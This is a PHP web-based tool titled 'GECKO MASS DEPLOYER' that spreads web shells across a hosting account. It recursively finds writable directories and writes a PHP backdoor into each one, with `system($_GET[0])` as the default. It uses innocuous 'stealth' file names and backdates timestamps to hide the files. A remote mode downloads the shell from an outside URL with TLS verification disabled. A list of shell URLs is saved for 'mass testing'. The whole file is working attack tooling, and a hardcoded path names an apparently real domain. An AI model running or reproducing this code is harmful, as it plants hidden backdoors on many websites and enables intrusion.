<?php
// ==================================================
// GECKO MASS DEPLOYER - DUAL MODE WITH AUTO-SAVE
// ==================================================
error_reporting(0);
@ini_set('display_errors', 0);

// System Check
function systemCheck() {
    $tools = [
        'wget' => `which wget`,
        'curl' => `which curl`,
        'python3' => `which python3`,
        'php' => `which php`,
        'nc' => `which nc`,
        'bash' => `which bash`
    ];
    
    foreach ($tools as $tool => $path) {
        $tools[$tool] = !empty($path) ? 'Available' : 'Not Available';
    }
    
    return $tools;
}

// Save results to .res.txt
function saveResultsToFile($results, $mode, $base_dir, $remote_url = null) {
    $filename = '.res.txt';
    $content = "===============================================\n";
    $content .= "GECKO MASS DEPLOYER - DEPLOYMENT RESULTS\n";
    $content .= "Generated: " . date('Y-m-d H:i:s') . "\n";
    $content .= "Mode: " . strtoupper($mode) . "\n";
    $content .= "Base Directory: " . $base_dir . "\n";
    
    if ($remote_url) {
        $content .= "Remote URL: " . $remote_url . "\n";
    }
    
    $content .= "===============================================\n\n";
    
    if (isset($results['error'])) {
        $content .= "ERROR: " . $results['error'] . "\n";
    } else {
        $content .= "STATISTICS:\n";
        $content .= "✅ Files Deployed: " . $results['deployed_count'] . "\n";
        $content .= "📁 Directories Scanned: " . $results['total_scanned'] . "\n";
        $content .= "📂 Writable Directories: " . $results['total_writable'] . "\n";
        $content .= "📊 Success Rate: " . ($results['total_writable'] > 0 ? round(($results['deployed_count'] / $results['total_writable']) * 100, 1) : 0) . "%\n";
        
        if (isset($results['download_method'])) {
            $content .= "🌐 Download Method: " . strtoupper($results['download_method']) . "\n";
        }
        
        $content .= "\nDEPLOYED FILES:\n";
        $content .= "===============================================\n";
        
        foreach ($results['files'] as $index => $file) {
            $content .= "\n" . ($index + 1) . ". URL: " . $file['url'] . "\n";
            $content .= "   Path: " . $file['path'] . "\n";
            $content .= "   Files in Directory: " . $file['file_count'] . "\n";
            $content .= "   Timestamp: " . $file['timestamp'] . "\n";
            $content .= "   Size: " . $file['size'] . " bytes\n";
        }
        
        $content .= "\n===============================================\n";
        $content .= "TOTAL URLS: " . count($results['files']) . "\n";
        $content .= "Copy URLs below for mass testing:\n\n";
        
        foreach ($results['files'] as $file) {
            $content .= $file['url'] . "\n";
        }
    }
    
    $save_result = @file_put_contents($filename, $content);
    return $save_result ? $filename : false;
}

// Deep Directory Scanning
function scanDeepDirectories($base_dir, $max_depth = 10) {
    if (!@is_dir($base_dir)) {
        return ['error' => 'Base directory does not exist: ' . $base_dir];
    }

    $writable_dirs = [];
    $scan_queue = [[rtrim($base_dir, '/'), 0]];
    $scanned_count = 0;
    
    $blacklist = ['.git', '.svn', '.htaccess', 'cgi-bin', 'wp-admin', 'wp-includes', 'node_modules', 'vendor'];
    
    while (!empty($scan_queue)) {
        list($current_dir, $depth) = array_shift($scan_queue);
        
        if ($depth > $max_depth) continue;
        
        $dir_name = basename($current_dir);
        if (in_array($dir_name, $blacklist)) continue;
        
        try {
            $items = @scandir($current_dir);
            if (!$items) continue;
            
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $full_path = $current_dir . '/' . $item;
                
                if (@is_dir($full_path)) {
                    $scan_queue[] = [$full_path, $depth + 1];
                    $scanned_count++;
                    
                    if (@is_writable($full_path)) {
                        $file_count = 0;
                        $php_files = 0;
                        
                        $dir_items = @scandir($full_path);
                        if ($dir_items) {
                            foreach ($dir_items as $dir_item) {
                                if ($dir_item != '.' && $dir_item != '..') {
                                    $file_count++;
                                    if (preg_match('/\.php$/i', $dir_item)) {
                                        $php_files++;
                                    }
                                }
                            }
                        }
                        
                        if ($file_count > 0) {
                            $oldest_time = getOldestFileTimestamp($full_path);
                            $writable_dirs[] = [
                                'path' => $full_path,
                                'depth' => $depth,
                                'file_count' => $file_count,
                                'php_files' => $php_files,
                                'writable' => true,
                                'oldest_time' => $oldest_time,
                                'domain' => extractDomainFromPath($full_path)
                            ];
                        }
                    }
                }
            }
        } catch (Exception $e) {
            continue;
        }
    }
    
    return [
        'writable_dirs' => $writable_dirs,
        'scanned_count' => $scanned_count,
        'total_writable' => count($writable_dirs)
    ];
}

function getOldestFileTimestamp($dir) {
    $oldest = time();
    $files = @scandir($dir);
    
    if (!$files) return $oldest;
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filepath = $dir . '/' . $file;
        if (@is_file($filepath)) {
            $mtime = @filemtime($filepath);
            if ($mtime && $mtime < $oldest) {
                $oldest = $mtime;
            }
        }
    }
    return $oldest;
}

function extractDomainFromPath($path) {
    if (preg_match('/domains\/([^\/]+)/', $path, $matches)) {
        return $matches[1] . '.com';
    }
    if (preg_match('/public_html\/([^\/]+)/', $path, $matches)) {
        return $matches[1] . '.com';
    }
    return 'localhost';
}

// Normal Mode Deployment
function deployMassFiles($base_dir, $file_content, $file_names) {
    $scan_result = scanDeepDirectories($base_dir, 8);
    
    if (isset($scan_result['error'])) {
        return ['error' => $scan_result['error']];
    }
    
    $writable_dirs = $scan_result['writable_dirs'];
    $deployed_files = [];
    $success_count = 0;
    
    foreach ($writable_dirs as $dir_info) {
        $random_file = $file_names[array_rand($file_names)];
        $target_file = $dir_info['path'] . '/' . $random_file;
        
        if (@file_exists($target_file)) {
            continue;
        }
        
        $write_result = @file_put_contents($target_file, $file_content);
        
        if ($write_result !== false) {
            @touch($target_file, $dir_info['oldest_time']);
            
            $web_url = 'https://' . $dir_info['domain'] . str_replace($base_dir, '', $target_file);
            
            $deployed_files[] = [
                'url' => $web_url,
                'path' => $target_file,
                'file_count' => $dir_info['file_count'],
                'timestamp' => date('Y-m-d H:i:s', $dir_info['oldest_time']),
                'size' => $write_result
            ];
            $success_count++;
        }
    }
    
    return [
        'success' => true,
        'deployed_count' => $success_count,
        'total_scanned' => $scan_result['scanned_count'],
        'total_writable' => $scan_result['total_writable'],
        'files' => $deployed_files
    ];
}

// Remote Mode Download
function downloadRemoteContent($url, $method = 'auto') {
    $content = '';
    $used_method = '';
    
    if ($method === 'auto') {
        $methods = ['curl', 'wget', 'php'];
        foreach ($methods as $try_method) {
            $result = downloadWithMethod($url, $try_method);
            if ($result['success']) {
                $content = $result['content'];
                $used_method = $try_method;
                break;
            }
        }
    } else {
        $result = downloadWithMethod($url, $method);
        $content = $result['content'];
        $used_method = $method;
    }
    
    return [
        'content' => $content,
        'method' => $used_method,
        'success' => !empty($content)
    ];
}

function downloadWithMethod($url, $method) {
    $content = '';
    $success = false;
    
    switch ($method) {
        case 'curl':
            if (function_exists('curl_version')) {
                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_TIMEOUT => 30,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                ]);
                $content = curl_exec($ch);
                $success = curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200;
                curl_close($ch);
            }
            break;
            
        case 'wget':
            if (`which wget`) {
                $temp_file = tempnam(sys_get_temp_dir(), 'geo_');
                $cmd = "wget --no-check-certificate -q -O " . escapeshellarg($temp_file) . " " . escapeshellarg($url) . " 2>/dev/null";
                @shell_exec($cmd);
                if (file_exists($temp_file)) {
                    $content = @file_get_contents($temp_file);
                    $success = !empty($content);
                    @unlink($temp_file);
                }
            }
            break;
            
        case 'php':
            $context = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                    'timeout' => 30
                ],
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false
                ]
            ]);
            $content = @file_get_contents($url, false, $context);
            $success = $content !== false;
            break;
    }
    
    return ['content' => $content, 'success' => $success];
}

function deployRemoteMassFiles($base_dir, $remote_url, $file_names, $download_method = 'auto') {
    $download_result = downloadRemoteContent($remote_url, $download_method);
    
    if (!$download_result['success']) {
        return ['error' => 'Failed to download remote file. Tried method: ' . $download_result['method']];
    }
    
    $file_content = $download_result['content'];
    $used_method = $download_result['method'];
    
    $scan_result = scanDeepDirectories($base_dir, 8);
    
    if (isset($scan_result['error'])) {
        return ['error' => $scan_result['error']];
    }
    
    $writable_dirs = $scan_result['writable_dirs'];
    $deployed_files = [];
    $success_count = 0;
    
    foreach ($writable_dirs as $dir_info) {
        $random_file = $file_names[array_rand($file_names)];
        $target_file = $dir_info['path'] . '/' . $random_file;
        
        if (@file_exists($target_file)) {
            continue;
        }
        
        $write_result = @file_put_contents($target_file, $file_content);
        
        if ($write_result !== false) {
            @touch($target_file, $dir_info['oldest_time']);
            
            $web_url = 'https://' . $dir_info['domain'] . str_replace($base_dir, '', $target_file);
            
            $deployed_files[] = [
                'url' => $web_url,
                'path' => $target_file,
                'file_count' => $dir_info['file_count'],
                'timestamp' => date('Y-m-d H:i:s', $dir_info['oldest_time']),
                'size' => $write_result
            ];
            $success_count++;
        }
    }
    
    return [
        'success' => true,
        'deployed_count' => $success_count,
        'total_scanned' => $scan_result['scanned_count'],
        'total_writable' => $scan_result['total_writable'],
        'download_method' => $used_method,
        'files' => $deployed_files
    ];
}

// Process requests
$system_tools = systemCheck();
$current_mode = $_GET['mode'] ?? 'normal';
$result = null;
$saved_file = null;

if ($_POST) {
    if ($_POST['action'] == 'deploy_normal') {
        $base_dir = $_POST['base_directory'];
        $file_content = $_POST['file_content'];
        $file_names = array_filter(array_map('trim', explode("\n", $_POST['file_names'])));
        
        if (empty($file_names)) {
            $file_names = ['cache.php', 'session.php', 'debug.php', 'log.php', 'config.php'];
        }
        
        $result = deployMassFiles($base_dir, $file_content, $file_names);
        if (!isset($result['error'])) {
            $saved_file = saveResultsToFile($result, 'normal', $base_dir);
        }
        $current_mode = 'normal';
        
    } elseif ($_POST['action'] == 'deploy_remote') {
        $base_dir = $_POST['base_directory'];
        $remote_url = $_POST['remote_url'];
        $file_names = array_filter(array_map('trim', explode("\n", $_POST['file_names'])));
        $download_method = $_POST['download_method'] ?? 'auto';
        
        if (empty($file_names)) {
            $file_names = ['cache.php', 'session.php', 'debug.php', 'log.php', 'config.php'];
        }
        
        $result = deployRemoteMassFiles($base_dir, $remote_url, $file_names, $download_method);
        if (!isset($result['error'])) {
            $saved_file = saveResultsToFile($result, 'remote', $base_dir, $remote_url);
        }
        $current_mode = 'remote';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GECKO MASS DEPLOYER</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-tertiary: #1a1a1a;
            --accent-primary: #ffffff;
            --accent-secondary: #333333;
            --text-primary: #ffffff;
            --text-secondary: #888888;
            --success: #27ae60;
            --warning: #f39c12;
            --danger: #e74c3c;
            --info: #3498db;
        }
        
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Rubik', sans-serif;
            min-height: 100vh;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: var(--bg-secondary);
            border: 1px solid var(--accent-secondary);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .logo {
            font-size: 3em;
            font-weight: 700;
            background: linear-gradient(45deg, var(--accent-primary), var(--text-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: var(--text-secondary);
            font-size: 1.2em;
            margin-bottom: 20px;
        }
        
        .mode-selector {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-bottom: 25px;
        }
        
        .mode-btn {
            padding: 12px 30px;
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border: 2px solid var(--accent-secondary);
            border-radius: 10px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            text-decoration: none;
        }
        
        .mode-btn.active {
            background: var(--accent-primary);
            color: var(--bg-primary);
            border-color: var(--accent-primary);
        }
        
        .mode-btn:hover {
            transform: translateY(-2px);
        }
        
        .tools-status {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 25px 0;
        }
        
        .tool-item {
            background: var(--bg-tertiary);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            border-left: 4px solid var(--success);
        }
        
        .tool-item.unavailable {
            border-left-color: var(--danger);
        }
        
        .tool-name {
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .tool-status {
            font-size: 0.9em;
            color: var(--text-secondary);
        }
        
        .form-section {
            background: var(--bg-secondary);
            border: 1px solid var(--accent-secondary);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 25px;
        }
        
        .section-title {
            font-size: 1.4em;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title::before {
            content: "▶";
            color: var(--accent-primary);
            font-size: 0.8em;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text-primary);
        }
        
        input, textarea, select {
            width: 100%;
            padding: 14px 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--accent-secondary);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'Rubik', sans-serif;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px rgba(255,255,255,0.1);
        }
        
        textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            background: var(--accent-primary);
            color: var(--bg-primary);
            border: none;
            padding: 16px 32px;
            border-radius: 8px;
            font-family: 'Rubik', sans-serif;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn:hover {
            background: #e0e0e0;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255,255,255,0.1);
        }
        
        .btn-full {
            width: 100%;
        }
        
        .btn-secondary {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid var(--accent-secondary);
        }
        
        .results-section {
            background: var(--bg-secondary);
            border: 1px solid var(--accent-secondary);
            border-radius: 12px;
            padding: 30px;
            margin-top: 30px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: var(--bg-tertiary);
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            border-left: 4px solid var(--accent-primary);
        }
        
        .stat-number {
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: var(--text-secondary);
            font-weight: 500;
            font-size: 0.9em;
        }
        
        .alert {
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background: rgba(39, 174, 96, 0.1);
            border-color: var(--success);
            color: var(--success);
        }
        
        .alert-error {
            background: rgba(231, 76, 60, 0.1);
            border-color: var(--danger);
            color: var(--danger);
        }
        
        .alert-info {
            background: rgba(52, 152, 219, 0.1);
            border-color: var(--info);
            color: var(--info);
        }
        
        .alert-warning {
            background: rgba(243, 156, 18, 0.1);
            border-color: var(--warning);
            color: var(--warning);
        }
        
        .results-list {
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
        }
        
        .result-item {
            background: var(--bg-tertiary);
            border: 1px solid var(--accent-secondary);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }
        
        .result-item:hover {
            border-color: var(--accent-primary);
            transform: translateX(5px);
        }
        
        .result-url {
            color: var(--accent-primary);
            font-weight: 600;
            text-decoration: none;
            word-break: break-all;
            display: block;
            margin-bottom: 8px;
        }
        
        .result-url:hover {
            color: var(--text-secondary);
        }
        
        .result-meta {
            color: var(--text-secondary);
            font-size: 0.85em;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .file-save-info {
            background: var(--bg-tertiary);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid var(--success);
        }
        
        .file-content {
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            background: var(--bg-primary);
            padding: 15px;
            border-radius: 6px;
            margin-top: 10px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .tools-status { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: 1fr; }
            .mode-selector { flex-direction: column; }
            .result-meta { flex-direction: column; gap: 5px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">GECKO MASS DEPLOYER</div>
            <div class="subtitle">HTB RED TEAM - DUAL MODE DEPLOYMENT WITH AUTO-SAVE</div>
            
            <div class="mode-selector">
                <a href="?mode=normal" class="mode-btn <?php echo $current_mode == 'normal' ? 'active' : ''; ?>">
                    📁 NORMAL MODE
                </a>
                <a href="?mode=remote" class="mode-btn <?php echo $current_mode == 'remote' ? 'active' : ''; ?>">
                    🌐 REMOTE MODE
                </a>
            </div>
            
            <div class="tools-status">
                <?php foreach ($system_tools as $tool => $status): ?>
                    <div class="tool-item <?php echo $status == 'Available' ? '' : 'unavailable'; ?>">
                        <div class="tool-name"><?php echo strtoupper($tool); ?></div>
                        <div class="tool-status"><?php echo $status; ?></div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Normal Mode Form -->
        <?php if ($current_mode == 'normal'): ?>
        <form method="POST">
            <input type="hidden" name="action" value="deploy_normal">
            
            <div class="form-section">
                <div class="section-title">DIRECTORY CONFIGURATION</div>
                <div class="form-group">
                    <label for="base_directory">Base Directory Path</label>
                    <input type="text" id="base_directory" name="base_directory" 
                           value="/home/u611949080/domains/webenier.com/public_html" 
                           placeholder="Enter full directory path for deep scanning" required>
                </div>
            </div>

            <div class="form-section">
                <div class="section-title">SHELL CONTENT</div>
                <div class="form-group">
                    <label for="file_content">PHP Shell Code</label>
                    <textarea id="file_content" name="file_content" placeholder="Enter your PHP shell code..." required><?php echo htmlspecialchars('<?php if(isset($_GET[0])){system($_GET[0]);}?>'); ?></textarea>
                </div>
            </div>

            <div class="form-section">
                <div class="section-title">STEALTH FILE NAMES</div>
                <div class="form-group">
                    <label for="file_names">File Names (one per line, randomly selected)</label>
                    <textarea id="file_names" name="file_names" placeholder="Enter stealth file names...">cache.php
session.php
debug.php
log.php
config.php
api.php
auth.php
temp.php
backup.php
test.php
index.php
main.php</textarea>
                </div>
            </div>

            <button type="submit" class="btn btn-full">
                🚀 START MASS DEPLOYMENT & AUTO-SAVE
            </button>
        </form>
        <?php endif; ?>

        <!-- Remote Mode Form -->
        <?php if ($current_mode == 'remote'): ?>
        <form method="POST">
            <input type="hidden" name="action" value="deploy_remote">
            
            <div class="form-section">
                <div class="section-title">REMOTE SOURCE</div>
                <div class="form-group">
                    <label for="remote_url">Remote File URL</label>
                    <input type="url" id="remote_url" name="remote_url" 
                           placeholder="https://raw.githubusercontent.com/example/shell.txt" required>
                </div>
                
                <div class="form-group">
                    <label for="download_method">Download Method</label>
                    <select id="download_method" name="download_method">
                        <option value="auto">Auto-detect (Recommended)</option>
                        <option value="curl">Force cURL</option>
                        <option value="wget">Force wget</option>
                        <option value="php">PHP file_get_contents</option>
                    </select>
                </div>
            </div>

            <div class="form-section">
                <div class="section-title">TARGET DIRECTORY</div>
                <div class="form-group">
                    <label for="base_directory">Base Directory Path</label>
                    <input type="text" id="base_directory" name="base_directory" 
                           value="/home/u611949080/domains/webenier.com/public_html" 
                           placeholder="Enter full directory path" required>
                </div>
            </div>

            <div class="form-section">
                <div class="section-title">STEALTH FILE NAMES</div>
                <div class="form-group">
                    <label for="file_names">File Names (one per line)</label>
                    <textarea id="file_names" name="file_names" placeholder="Enter stealth file names...">cache.php
session.php
debug.php
log.php
config.php
api.php
auth.php
temp.php
backup.php
test.php
index.php
main.php</textarea>
                </div>
            </div>

            <button type="submit" class="btn btn-full">
                🌐 DOWNLOAD & MASS DEPLOY & AUTO-SAVE
            </button>
        </form>
        <?php endif; ?>

        <!-- Results Section -->
        <?php if ($result): ?>
            <div class="results-section">
                <div class="section-title">DEPLOYMENT RESULTS</div>
                
                <?php if ($saved_file): ?>
                    <div class="file-save-info">
                        ✅ <strong>Results automatically saved to:</strong> <?php echo $saved_file; ?>
                        <div class="file-content">
                            File created: <?php echo $saved_file; ?><br>
                            Contains all URLs and paths for easy copying
                        </div>
                    </div>
                <?php endif; ?>
                
                <?php if (isset($result['error'])): ?>
                    <div class="alert alert-error"><?php echo $result['error']; ?></div>
                <?php else: ?>
                    <?php if (isset($result['download_method'])): ?>
                        <div class="alert alert-info">
                            📥 Downloaded using: <strong><?php echo strtoupper($result['download_method']); ?></strong>
                        </div>
                    <?php endif; ?>
                    
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-number"><?php echo $result['deployed_count']; ?></div>
                            <div class="stat-label">Files Deployed</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number"><?php echo $result['total_scanned']; ?></div>
                            <div class="stat-label">Directories Scanned</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number"><?php echo $result['total_writable']; ?></div>
                            <div class="stat-label">Writable Directories</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number"><?php echo $result['total_writable'] > 0 ? round(($result['deployed_count'] / $result['total_writable']) * 100, 1) : 0; ?>%</div>
                            <div class="stat-label">Success Rate</div>
                        </div>
                    </div>
                    
                    <?php if ($result['deployed_count'] > 0): ?>
                        <div class="alert alert-success">
                            ✅ Successfully deployed <?php echo $result['deployed_count']; ?> files! 
                            All results saved to <strong><?php echo $saved_file; ?></strong>
                        </div>
                        
                        <div class="results-list">
                            <?php foreach ($result['files'] as $file): ?>
                                <div class="result-item">
                                    <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank" class="result-url">
                                        <?php echo htmlspecialchars($file['url']); ?>
                                    </a>
                                    <div class="result-meta">
                                        <span>Path: <?php echo htmlspecialchars($file['path']); ?></span>
                                        <span>Files in dir: <?php echo $file['file_count']; ?></span>
                                        <span>Timestamp: <?php echo $file['timestamp']; ?></span>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                        
                        <div class="alert alert-info">
                            💡 <strong>Pro Tip:</strong> All URLs have been saved to <code><?php echo $saved_file; ?></code> 
                            for easy mass testing. Use tools like nuclei, dirsearch, or custom scripts to test all endpoints.
                        </div>
                    <?php else: ?>
                        <div class="alert alert-warning">
                            ⚠️ No files were deployed. Check directory permissions and configuration.
                        </div>
                    <?php endif; ?>
                <?php endif; ?>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="?mode=<?php echo $current_mode; ?>" class="btn">
                        🔄 NEW DEPLOYMENT
                    </a>
                </div>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
